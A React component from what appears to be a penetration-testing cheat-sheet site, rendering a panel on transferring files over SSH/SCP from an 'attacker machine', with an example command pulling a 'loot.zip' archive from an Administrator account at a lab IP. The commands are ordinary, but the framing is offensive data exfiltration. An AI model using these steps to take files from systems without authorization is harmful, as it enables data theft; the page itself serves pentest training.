import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const FT_ssh = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
                <Typography variant="h6">
              Description
              </Typography>
              <Typography>
              SSH comes with an SCP utility for remote file transfer. We can setup an SSH server on our attacker machine and use the SCP utility to transfer files.
              </Typography>
              <Box pt={5}></Box>
              <Typography variant="h6">
              Step 1 - Machine 1
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'sudo systemctl enable ssh'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2 - Machine 1
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'sudo systemctl start ssh'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 3 - Machine 2
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'scp {USER}@{IP}:{FILE_TO_TRANSFER} {FILE_DESTINATION}'}
            </SyntaxHighlighter>
            <Typography variant="h6">
           Example
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'scp Administrator@10.10.138.42:/Users/Administrator/20220623131857_loot.zip .'}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default FT_ssh;
  